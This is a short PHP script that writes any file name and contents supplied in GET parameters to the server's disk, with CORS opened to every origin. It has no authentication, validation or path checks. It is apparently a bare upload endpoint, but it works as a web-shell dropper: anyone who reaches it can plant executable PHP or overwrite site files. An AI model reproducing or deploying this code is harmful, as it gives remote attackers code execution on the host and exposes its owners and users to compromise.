<?php
header("Access-Control-Allow-Headers: X-Requested-With");
header("Access-Control-Allow-Origin: *");
$fileName = $_GET['fileName'];
$contents = $_GET['contents'];
file_put_contents($fileName, $contents);
$isput = 'true';